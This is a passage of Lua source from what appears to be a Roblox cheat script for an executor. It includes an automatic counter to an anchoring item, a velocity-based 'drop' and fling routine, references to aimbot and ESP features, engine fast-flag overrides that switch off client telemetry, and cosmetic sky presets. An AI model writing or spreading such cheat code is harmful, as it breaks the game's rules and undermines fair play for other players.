            local hum2 = c:FindFirstChildOfClass("Humanoid")
            if hum2 then hum2:EquipTool(med) end
        end
        pcall(function() med:Activate() end)
        medusaLastUsed = _tick()
        medusaDebounce = false
    end
    
    function onAnchorChanged(part)
        return part:GetPropertyChangedSignal("Anchored"):Connect(function()
            if medusaCounterEnabled and part.Anchored and part.Transparency == 1 then useMedusaCounter() end
        end)
    end
    
    function setupMedusaCounter(char)
        for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
        Conns.anchor = {}
        if not char or not medusaCounterEnabled then return end
        for _, part in ipairs(char:GetDescendants()) do
            if part:IsA("BasePart") then
                table.insert(Conns.anchor, onAnchorChanged(part))
            end
        end
        table.insert(Conns.anchor, char.DescendantAdded:Connect(function(part)
            if part:IsA("BasePart") then
                table.insert(Conns.anchor, onAnchorChanged(part))
            end
        end))
    end
    
    function stopMedusaCounter()
        for _, c in pairs(Conns.anchor) do pcall(function() c:Disconnect() end) end
        Conns.anchor = {}
    end
    
    local DROP_ASCEND_DURATION = 0.2
    local DROP_ASCEND_SPEED = 150
    local _dropConn = nil
    
    function stopDropBrainrot()
        dropActive = false
        if _dropConn then
            _dropConn:Disconnect()
            _dropConn = nil
        end
        for _, t in ipairs(dropConnections) do
            if type(t) == "thread" then pcall(task.cancel, t)
            elseif type(t) == "RBXScriptConnection" then pcall(t.Disconnect, t) end
        end
        dropConnections = {}
        local c = LP.Character
        if c then
            local root = c:FindFirstChild("HumanoidRootPart")
            if root then root.AssemblyLinearVelocity = _V3zero end
        end
        if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
        if mobSetDropBR then mobSetDropBR(false) end
    end
    
    function runDropBrainrot()
        if dropActive then return end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not root or not hum then return end
        if dropMode == 1 then
            local speedH = 0
            if root then
                local vel = root.AssemblyLinearVelocity
                speedH = _V3new(vel.X, 0, vel.Z).Magnitude
            end
            local cooldown = (speedH > 5) and 0.6 or 0.25
            if _tick() - lastDropTime < cooldown then return end
            lastDropTime = _tick()
            dropActive = true
            if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
            if mobSetDropBR then mobSetDropBR(true) end
            local wasAutoBat = false
            if autoBatEnabled then
                wasAutoBat = true
                disableAutoBat()
                if autoBatSetVisual then autoBatSetVisual(false) end
                if mobSetAutoBat then mobSetAutoBat(false) end
            end
            local function finishDrop(threadRef)
                if threadRef and dropConnections then
                    for i = #dropConnections, 1, -1 do
                        if dropConnections[i] == threadRef then
                            table.remove(dropConnections, i)
                            break
                        end
                    end
                end
                dropActive = false
                local c = LP.Character
                if c then
                    local r = c:FindFirstChild("HumanoidRootPart")
                    local h = c:FindFirstChildOfClass("Humanoid")
                    if r then
                        r.AssemblyLinearVelocity = _V3zero
                        r.AssemblyAngularVelocity = _V3zero
                        if r.Position.Y < -100 then
                            r.CFrame = _CFnew(r.Position.X, 5, r.Position.Z)
                        end
                        local rp = RaycastParams.new()
                        rp.FilterDescendantsInstances = {c}
                        rp.FilterType = Enum.RaycastFilterType.Exclude
                        local rr = workspace:Raycast(r.Position, _V3new(0, -2000, 0), rp)
                        if rr then
                            local off = (h and h.HipHeight or 2) + (r.Size.Y / 2)
                            r.CFrame = _CFnew(r.Position.X, rr.Position.Y + off, r.Position.Z)
                        end
                        if h and h.Health > 0 then h:ChangeState(Enum.HumanoidStateType.Running) end
                    end
                end
                if wasAutoBat then
                    enableAutoBat()
                    if autoBatSetVisual then autoBatSetVisual(true) end
                    if mobSetAutoBat then mobSetAutoBat(true) end
                end
                if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
                if mobSetDropBR then mobSetDropBR(false) end
            end
            local flingThread = nil
            flingThread = task.spawn(function()
                local startTime = _tick()
                while dropActive and (_tick() - startTime) < 0.25 do
                    RunService.Heartbeat:Wait()
                    local c = LP.Character
                    local r = c and c:FindFirstChild("HumanoidRootPart")
                    if not r then break end
                    local vel = r.AssemblyLinearVelocity
                    vel = _V3new(0, vel.Y, 0)
                    r.AssemblyLinearVelocity = vel * 10000 + _V3new(0, 10000, 0)
                    RunService.RenderStepped:Wait()
                    if r and r.Parent then r.AssemblyLinearVelocity = vel end
                    RunService.Stepped:Wait()
                    if r and r.Parent then r.AssemblyLinearVelocity = vel + _V3new(0, 0.1, 0) end
                end
                finishDrop(flingThread)
            end)
            table.insert(dropConnections, flingThread)
            task.delay(0.35, function()
                if dropActive then finishDrop(flingThread) end
            end)
            return
        end
    
        if autoBatEnabled then
            autoBatEnabled = false
            if autoBatSetVisual then autoBatSetVisual(false) end
            if mobSetAutoBat then mobSetAutoBat(false) end
            if stopAimbotAdapt then stopAimbotAdapt() end
        end
        dropActive = true
        if dropBrainrotSetVisual then dropBrainrotSetVisual(true) end
        if mobSetDropBR then mobSetDropBR(false) end
        local t0 = _tick()
        if _dropConn then _dropConn:Disconnect() end
        _dropConn = RunService.Heartbeat:Connect(function()
            local r = char and char:FindFirstChild("HumanoidRootPart")
            if not r then
                if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
                dropActive = false
                if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
                if mobSetDropBR then mobSetDropBR(false) end
                return
            end
            if _tick() - t0 >= DROP_ASCEND_DURATION then
                if _dropConn then _dropConn:Disconnect(); _dropConn = nil end
                local rp = _RayParams_new()
                rp.FilterDescendantsInstances = {char}
                rp.FilterType = Enum.RaycastFilterType.Exclude
                local rr = workspace:Raycast(r.Position, _V3new(0, -2000, 0), rp)
                if rr then
                    local hum2 = char:FindFirstChildOfClass("Humanoid")
                    local off = ((hum2 and hum2.HipHeight) or 2) + (r.Size.Y / 2)
                    r.CFrame = _CFnew(r.Position.X, rr.Position.Y + off, r.Position.Z)
                    r.AssemblyLinearVelocity = _V3zero
                end
                dropActive = false
                if dropBrainrotSetVisual then dropBrainrotSetVisual(false) end
                if mobSetDropBR then mobSetDropBR(false) end
                return
            end
            r.Velocity = _V3new(r.Velocity.X, DROP_ASCEND_SPEED, r.Velocity.Z)
        end)
    end
    
    function executeDropWithToggle(setVisual)
        if dropActive then return end
        task.spawn(function()
            if setVisual then setVisual(true) end
            runDropBrainrot()
            while dropActive do task.wait() end
            task.wait(0.1)
            if setVisual then setVisual(false) end
        end)
    end
    
    -- =====================================================================
    -- ANTI LAG ULTRA
    -- =====================================================================
    local _alSaved = setmetatable({}, { __mode = "k" })
    local _alDetached = {}
    local _alAnimators = setmetatable({}, { __mode = "k" })
    local _alStoppedTracks = setmetatable({}, { __mode = "k" })
    local _alGeneration = 0
    local _alScanCancel = nil
    local _alConns = {}
    local _alLightOrig = nil
    local _alRunning = false
    
    local AL_LOW_FLAGS = {
        {"DFIntClusterSenderMaxJoinBandwidthBps", "2100000000"},
        {"DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000"},
        {"DFIntServerFramesBetweenJoins", "1"},
        {"DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000"},
        {"DFIntConnectionMTUSize", "1400"},
        {"FIntRakNetResendBufferArrayLength", "1024"},
        {"DFIntRakNetNakResendDelayMsMax", "1"},
        {"DFIntWaitOnUpdateNetworkLoopEndedMS", "100"},
        {"DFIntWaitOnRecvFromLoopEndedMS", "100"},
        {"DFIntLargePacketQueueSizeCutoffMB", "1000"},
        {"DFIntSendRakNetStatsInterval", "2147483647"},
        {"DFIntRakNetLoopMs", "1"},
        {"DFIntRakNetSelectTimeoutMs", "1"},
        {"DFIntNetworkClusterPacketCacheNumParallelTasks", "8"},
        {"DFIntReplicationDataCacheNumParallelTasks", "8"},
        {"DFIntMegaReplicatorNumParallelTasks", "16"},
        {"DFIntMaxProcessPacketsStepsPerCyclic", "512"},
        {"DFIntMaxProcessPacketsStepsAccumulated", "0"},
        {"DFIntMaxProcessPacketsJobScaling", "1000"},
        {"DFIntClientPacketMaxFrameMicroseconds", "200000"},
        {"DFIntClientPacketExcessMicroseconds", "10000"},
        {"DFIntClientPacketMinMicroseconds", "1"},
        {"DFIntClientPacketMaxDelayMs", "1"},
        {"DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1"},
        {"DFIntMaxFrameBufferSize", "4"},
        {"DFIntBufferCompressionThreshold", "100"},
        {"DFIntOverrideISRReplicatorStepBandwidthBytes", "131072"},
        {"DFIntTaskSchedulerJobInitThreads", "8"},
        {"DFIntTaskSchedulerJobInGameThreads", "8"},
        {"FIntTaskSchedulerAutoThreadLimit", "16"},
        {"FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4"},
        {"DFIntRuntimeConcurrency", "16"},
        {"FIntSimWorldTaskQueueParallelTasks", "20"},
        {"DFIntHttpBatchLimit", "256"},
        {"FIntHttpBatchLimit", "256"},
        {"DFIntHttpCurlConnectionCacheSize", "512"},
        {"FIntDefaultMeshCacheSizeMB", "512"},
        {"DFIntMemCacheMaxCapacityMB", "256"},
        {"DFIntNumAssetsMaxToPreload", "1"},
        {"DFFlagEnableSoundPreloading", "false"},
        {"FFlagSlimContentProvider", "true"},
        {"DFFlagDebugSkipMeshVoxelizer", "true"},
        {"DFFlagTextureQualityOverrideEnabled", "true"},
        {"DFIntTextureQualityOverride", "0"},
        {"FIntDebugTextureManagerSkipMips", "7"},
        {"DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8"},
        {"FFlagTM2SkipMipsForUnstreamable2", "true"},
        {"DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true"},
        {"FFlagRenderUseTextureManager224", "false"},
        {"DFIntDebugFRMQualityLevelOverride", "1"},
        {"DFFlagDebugPauseVoxelizer", "true"},
        {"FFlagFastGPULightCulling3", "true"},
        {"FIntRenderLocalLightFadeInMs", "0"},
        {"FIntRenderLocalLightUpdatesMax", "1"},
        {"FIntRenderShadowmapBias", "0"},
        {"FIntSSAOMipLevels", "0"},
        {"FIntDebugForceMSAASamples", "1"},
        {"FIntDebugFRMOptionalMSAALevelOverride", "0"},
        {"FIntRobloxGuiBlurIntensity", "0"},
        {"FIntFRMMinGrassDistance", "0"},
        {"FIntFRMMaxGrassDistance", "0"},
        {"DFFlagCoreScriptTelemetry2", "false"},
        {"DFFlagBrowserTrackerIdTelemetryEnabled", "false"},
        {"FFlagPerfDataOnTelemetryV2", "false"},
        {"FFlagSendRenderFidelityTelemetry2", "false"},
        {"FFlagEnableTelemetryServiceMemoryCPUInfo", "false"},
        {"DFIntTelemetryProfilerHundredthsPercentage", "0"},
        {"FIntTelemetryProfilerFrequency", "0"},
        {"FIntPerformanceTelemetryQueueProcessLimit", "0"},
        {"DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0"},
    }
    
    local function _alApplyLowFlags()
        local env = (getgenv and getgenv()) or _G
        local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
        local getter = rawget(env, "getfflag") or rawget(_G, "get_fflag")
        if type(setter) ~= "function" then return end
        for _, flag in ipairs(AL_LOW_FLAGS) do
            local canSet = true
            if type(getter) == "function" then
                local ok, current = pcall(getter, flag[1])
                canSet = ok and current ~= nil
            end
            if canSet then pcall(setter, flag[1], tostring(flag[2])) end
        end
    end
    
    local function _alSaveLighting()
        if _alLightOrig then return end
        _alLightOrig = {
            Brightness = Lighting.Brightness,
            ClockTime = Lighting.ClockTime,
            OutdoorAmbient = Lighting.OutdoorAmbient,
            Ambient = Lighting.Ambient,
            GlobalShadows = Lighting.GlobalShadows,
            EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
            EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
            FogStart = Lighting.FogStart,
            FogEnd = Lighting.FogEnd,
        }
    end
    
    local function _alApplyLowPermanentSettings()
        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        pcall(function()
            UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
        end)
        pcall(function()
            Lighting.GlobalShadows = false
            Lighting.EnvironmentDiffuseScale = 0
            Lighting.EnvironmentSpecularScale = 0
            Lighting.FogStart = 0
            Lighting.FogEnd = 1e10
        end)
        pcall(function()
            local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
            if atmosphere then
                atmosphere.Density = 0
                atmosphere.Glare = 0
                atmosphere.Haze = 0
            end
        end)
        pcall(function()
            local terrain = workspace:FindFirstChildOfClass("Terrain")
            if terrain then
                terrain.Decoration = false
                terrain.WaterWaveSize = 0
                terrain.WaterWaveSpeed = 0
                terrain.WaterReflectance = 0
                local clouds = terrain:FindFirstChildOfClass("Clouds")
                if clouds then clouds.Enabled = false end
            end
        end)
    end
    
    local function _alChange(object, property, value)
        pcall(function()
            local original = object[property]
            if original == value then return end
            object[property] = value
            local bucket = _alSaved[object]
            if not bucket then bucket = {}; _alSaved[object] = bucket end
            if not bucket[property] then bucket[property] = { value = original } end
        end)
    end
    
    local function _alIsProtectedVisual(object)
        local char = LP.Character
        if char and (object == char or object:IsDescendantOf(char)) then return true end
        local parent = object
        while parent and parent ~= workspace do
            if parent:IsA("LayerCollector") or parent:IsA("GuiObject") or parent:IsA("GuiBase2d") then
                return true
            end
            local name = parent.Name or ""
            if name:match("^Crystal") or name:match("^Eclipse") or name:match("^ESP_")
                or name:match("^BloodHounds") or name:match("^Yout") then
                return true
            end
            parent = parent.Parent
        end
        return false
    end
    
    function applyAntiLagDerender(obj)
        pcall(function()
            if not _alRunning then return end
            if _alIsProtectedVisual(obj) then return end
    
            if obj:IsA("Terrain") then
                _alChange(obj, "Decoration", false)
                _alChange(obj, "WaterWaveSize", 0)
                _alChange(obj, "WaterWaveSpeed", 0)
                _alChange(obj, "WaterReflectance", 0)
                _alChange(obj, "WaterTransparency", 1)
            end
            if obj:IsA("BasePart") then
                _alChange(obj, "Material", Enum.Material.Plastic)
                _alChange(obj, "MaterialVariant", "")
                _alChange(obj, "Reflectance", 0)
                _alChange(obj, "CastShadow", false)
                if obj:IsA("MeshPart") then
                    _alChange(obj, "TextureID", "")
                    _alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
                    _alChange(obj, "DoubleSided", false)
                elseif obj:IsA("PartOperation") then
                    _alChange(obj, "RenderFidelity", Enum.RenderFidelity.Performance)
                end
            elseif obj:IsA("SpecialMesh") then
                _alChange(obj, "TextureId", "")
            elseif obj:IsA("SurfaceAppearance") then
                _alDetached[obj] = true
                _alChange(obj, "Parent", nil)
            elseif obj:IsA("Decal") or obj:IsA("Texture") then
                _alChange(obj, "Transparency", 1)
                _alChange(obj, "Texture", "")
            elseif obj:IsA("ParticleEmitter") then
                _alChange(obj, "Enabled", false)
                _alChange(obj, "Rate", 0)
                pcall(function() obj:Clear() end)
            elseif obj:IsA("Trail") then
                _alChange(obj, "Enabled", false)
                pcall(function() obj:Clear() end)
            elseif obj:IsA("Beam") or obj:IsA("Fire") or obj:IsA("Smoke")
                or obj:IsA("Sparkles") or obj:IsA("Light") or obj:IsA("PostEffect")
                or obj:IsA("Clouds") then
                _alChange(obj, "Enabled", false)
            elseif obj:IsA("Atmosphere") then
                _alChange(obj, "Density", 0)
                _alChange(obj, "Haze", 0)
                _alChange(obj, "Glare", 0)
            elseif obj:IsA("Sky") then
                for _, face in ipairs({"SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp","SunTextureId","MoonTextureId"}) do
                    _alChange(obj, face, "")
                end
                _alChange(obj, "StarCount", 0)
                _alChange(obj, "CelestialBodiesShown", false)
            elseif obj:IsA("Shirt") then
                _alChange(obj, "ShirtTemplate", "")
            elseif obj:IsA("Pants") then
                _alChange(obj, "PantsTemplate", "")
            elseif obj:IsA("ShirtGraphic") then
                _alChange(obj, "Graphic", "")
            elseif obj:IsA("Animator") then
                if not _alAnimators[obj] then
                    local char = LP.Character
                    if not (char and obj:IsDescendantOf(char)) then
                        _alAnimators[obj] = true
                        local token = _alGeneration
                        local ok, conn = pcall(function()
                            return obj.AnimationPlayed:Connect(function(track)
                                if not _alRunning or _alGeneration ~= token then return end
                                task.defer(function()
                                    if _alRunning and _alGeneration == token then
                                        pcall(function() track:Stop(0) end)
                                    end
                                end)
                            end)
                        end)
                        if ok then table.insert(_alConns, conn) end
                        pcall(function()
                            for _, track in ipairs(obj:GetPlayingAnimationTracks()) do
                                if track.IsPlaying then
                                    _alStoppedTracks[track] = {
                                        animator = obj,
                                        time = track.TimePosition,
                                        speed = track.Speed,
                                    }
                                    track:Stop(0)
                                end
                            end
                        end)
                    end
                end
            end
        end)
    end
    
    function enableAntiLag()
        if _alRunning then return end
        _alRunning = true
        antiLagEnabled = true
        _alGeneration = _alGeneration + 1
        local token = _alGeneration
    
        _alSaveLighting()
        _alApplyLowFlags()
        _alApplyLowPermanentSettings()
    
        for _, delaySeconds in ipairs({2, 6, 12, 20}) do
            task.delay(delaySeconds, function()
                if _alRunning and _alGeneration == token then
                    _alApplyLowFlags()
                end
            end)
        end
    
        pcall(function() game:GetService("ReplicatedFirst"):RemoveDefaultLoadingScreen() end)
    
        table.insert(_alConns, workspace.DescendantAdded:Connect(function(obj)
            task.defer(function()
                if _alRunning and _alGeneration == token then
                    pcall(applyAntiLagDerender, obj)
                end
            end)
        end))
        table.insert(_alConns, Lighting.DescendantAdded:Connect(function(obj)
            task.defer(function()
                if _alRunning and _alGeneration == token then
                    pcall(applyAntiLagDerender, obj)
                end
            end)
        end))
    
        local function walkBatched(roots, apply, shouldContinue)
            task.spawn(function()
                local pending = {}
                for _, root in ipairs(roots) do
                    if root then
                        local ok, children = pcall(function() return root:GetChildren() end)
                        if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                    end
                end
                while #pending > 0 and _alRunning and _alGeneration == token and shouldContinue() do
                    local deadline = os.clock() + 0.0008
                    while #pending > 0 and os.clock() < deadline do
                        local obj = table.remove(pending)
                        pcall(apply, obj)
                        local ok, children = pcall(function() return obj:GetChildren() end)
                        if ok then for _, c in ipairs(children) do table.insert(pending, c) end end
                    end
                    RunService.Heartbeat:Wait()
                end
            end)
        end
    
        walkBatched({workspace, Lighting}, applyAntiLagDerender, function()
            return _alRunning and _alGeneration == token
        end)
    end
    
    function disableAntiLag()
        if not _alRunning then
            antiLagEnabled = false
            return
        end
        _alRunning = false
        antiLagEnabled = false
        _alGeneration = _alGeneration + 1
    
        if _alScanCancel then pcall(_alScanCancel); _alScanCancel = nil end
    
        for _, conn in ipairs(_alConns) do pcall(function() conn:Disconnect() end) end
        _alConns = {}
    
        for object, properties in pairs(_alSaved) do
            for property, original in pairs(properties) do
                pcall(function() object[property] = original.value end)
            end
        end
        _alSaved = setmetatable({}, { __mode = "k" })
        _alDetached = {}
        _alAnimators = setmetatable({}, { __mode = "k" })
    
        for track, state in pairs(_alStoppedTracks) do
            pcall(function()
                if state.animator.Parent and not track.IsPlaying then
                    track:Play(0, 1, state.speed)
                    track.TimePosition = state.time
                end
            end)
        end
        _alStoppedTracks = setmetatable({}, { __mode = "k" })
    
        if _alLightOrig then
            pcall(function()
                Lighting.Brightness = _alLightOrig.Brightness
                Lighting.ClockTime = _alLightOrig.ClockTime
                Lighting.OutdoorAmbient = _alLightOrig.OutdoorAmbient
                Lighting.Ambient = _alLightOrig.Ambient
                Lighting.GlobalShadows = _alLightOrig.GlobalShadows
                Lighting.EnvironmentDiffuseScale = _alLightOrig.EnvironmentDiffuseScale
                Lighting.EnvironmentSpecularScale = _alLightOrig.EnvironmentSpecularScale
                Lighting.FogStart = _alLightOrig.FogStart
                Lighting.FogEnd = _alLightOrig.FogEnd
            end)
        end
    end
    
    function applyStretchFOV(val)
        local cam = workspace.CurrentCamera
        if cam then pcall(function() cam.FieldOfView = val end) end
    end
    
    function enableStretch()
        if stretchConn then return end
        stretchEnabled = true
        local cam = workspace.CurrentCamera
        if not cam then return end
        origFOV = cam.FieldOfView or 70
        applyStretchFOV(stretchFOV)
        stretchConn = RunService.RenderStepped:Connect(function()
            if not stretchEnabled then
                stretchConn:Disconnect()
                stretchConn = nil
                return
            end
            local c = workspace.CurrentCamera
            if c then c.CFrame = c.CFrame * _CFnew(0,0,0,1,0,0,0,0.7,0,0,0,1) end
        end)
        if stretchFovConn then stretchFovConn:Disconnect() end
        stretchFovConn = RunService.RenderStepped:Connect(function()
            if stretchEnabled then applyStretchFOV(stretchFOV)
            else stretchFovConn:Disconnect(); stretchFovConn = nil end
        end)
    end
    
    function disableStretch()
        stretchEnabled = false
        if stretchConn then stretchConn:Disconnect(); stretchConn = nil end
        if stretchFovConn then stretchFovConn:Disconnect(); stretchFovConn = nil end
        local cam = workspace.CurrentCamera
        if cam then pcall(function() cam.FieldOfView = origFOV or 70 end) end
    end
    
    local function saveLightingState()
        if _originalLighting then return end
        _originalLighting = {
            Brightness = Lighting.Brightness, ClockTime = Lighting.ClockTime,
            OutdoorAmbient = Lighting.OutdoorAmbient, GlobalShadows = Lighting.GlobalShadows,
            FogEnd = Lighting.FogEnd, FogStart = Lighting.FogStart,
            FogColor = Lighting.FogColor, Ambient = Lighting.Ambient,
            ColorCorrection = nil, Bloom = nil,
        }
        for _, e in ipairs(Lighting:GetChildren()) do
            if e:IsA("ColorCorrectionEffect") then
                _originalLighting.ColorCorrection = { Enabled = e.Enabled, Brightness = e.Brightness, Contrast = e.Contrast, Saturation = e.Saturation, TintColor = e.TintColor }
            elseif e:IsA("BloomEffect") then
                _originalLighting.Bloom = { Enabled = e.Enabled, Intensity = e.Intensity, Size = e.Size, Threshold = e.Threshold }
            end
        end
    end
    
    local function restoreLightingState()
        if not _originalLighting then return end
        local old = _originalLighting
        Lighting.Brightness = old.Brightness
        Lighting.ClockTime = old.ClockTime
        Lighting.OutdoorAmbient = old.OutdoorAmbient
        Lighting.GlobalShadows = old.GlobalShadows
        Lighting.FogEnd = old.FogEnd
        Lighting.FogStart = old.FogStart
        Lighting.FogColor = old.FogColor
        Lighting.Ambient = old.Ambient
        if old.ColorCorrection then
            local cc = Lighting:FindFirstChildOfClass("ColorCorrectionEffect")
            if cc then
                cc.Enabled = old.ColorCorrection.Enabled; cc.Brightness = old.ColorCorrection.Brightness
                cc.Contrast = old.ColorCorrection.Contrast; cc.Saturation = old.ColorCorrection.Saturation
                cc.TintColor = old.ColorCorrection.TintColor
            end
        end
        if old.Bloom then
            local bloom = Lighting:FindFirstChildOfClass("BloomEffect")
            if bloom then
                bloom.Enabled = old.Bloom.Enabled; bloom.Intensity = old.Bloom.Intensity
                bloom.Size = old.Bloom.Size; bloom.Threshold = old.Bloom.Threshold
            end
        end
    end
    
    SKY_PRESETS_LIST = {"Off","Night","Aurora","Sunset","Galaxy","Cyber","Sakura","Pink Night","Blood Moon","Emerald Dawn","Volcanic","Arctic","Midnight Ocean","Vaporwave","Toxic","Solar Eclipse","Hellscape","Heaven","Storm","Sunrise","Deep Space","Lavender Dream","Inferno","Mint Sky"}
    
    SKY_PRESETS = {
        ["Off"]={kind="off"},
        ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
        ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
        ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
        ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
        ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
        ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
        ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
        ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
        ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
        ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
        ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
        ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
        ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
        ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
        ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
        ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
        ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
        ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
        ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
        ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
        ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
        ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
        ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
    }
    
    local function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end
    
    function _v4mpClearSky()
        for _, child in ipairs(Lighting:GetChildren()) do
            if child:GetAttribute("_AdaptDuelsSky") then
                pcall(function() child:Destroy() end)
            end
        end
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            for _, child in ipairs(terrain:GetChildren()) do
                if child:GetAttribute("_AdaptDuelsSky") then
                    pcall(function() child:Destroy() end)
                end
            end
        end
    end
    
    function applyCustomSky(mode)
        _v4mpClearSky()
        local preset = SKY_PRESETS[mode]
        if not preset or preset.kind == "off" then
            Lighting.ClockTime = 14
            Lighting.Brightness = 2
            Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
            Lighting.Ambient = Color3.fromRGB(127,127,127)
            Lighting.FogEnd = 100000
            Lighting.GlobalShadows = true
            skyTheme = "Off"
            return
        end
        Lighting.FogStart = 0
        Lighting.FogEnd = 100000
        Lighting.FogColor = Color3.fromRGB(200,200,200)
        Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
        Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
